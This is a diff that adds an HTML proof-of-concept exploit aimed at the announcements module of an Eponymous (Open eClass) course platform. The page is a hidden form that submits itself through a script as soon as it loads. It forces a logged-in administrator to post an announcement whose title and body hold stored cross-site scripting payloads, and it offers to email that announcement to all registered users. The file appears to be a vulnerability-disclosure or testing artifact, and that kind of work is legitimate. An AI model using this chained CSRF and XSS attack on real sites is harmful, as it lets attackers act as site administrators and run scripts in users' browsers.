@@ -1,0 +1,41 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/announcements/announcements.php' method='post'>
+
+		<table width='99%' class='FormData' align='center'>
+      <tbody>
+      <tr>
+        <th width='220'>&nbsp;</th>
+        <td><b>Προσθήκη Ανακοίνωσης</b></td>
+      </tr>
+      <tr>
+        <th width='150' class='left'>Τίτλος Ανακοίνωσης:</th>
+        <td><input type='text' name='antitle' value="<script>alert('xss')</script>" size='50' class='FormData_InputText' /></td>
+      </tr>
+      <tr>
+        <th class='left'>Σώμα Ανακοίνωσης:</th>
+        <td>
+          <table class='xinha_editor'>
+          <tr>
+            <td><textarea id='xinha' name='newContent' value="<script>alert('xss')</script>"></textarea></td>
+          </tr>
+          </table>
+        </td>
+      </tr>
+      <tr>
+        <th>&nbsp;</th>
+        <td><input type='checkbox' value='1' name='emailOption' /> Αποστολή (με email) της ανακοίνωσης στους εγγεγραμμένους χρήστες</td>
+      </tr>
+      <tr>
+        <th>&nbsp;</th>
+        <td><input type='text' name='submitAnnouncement' value='Προσθήκη' /></td>
+      </tr>
+      </tbody>
+      </table>
+      <input type='hidden' name='id' value='' />
+
+  <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
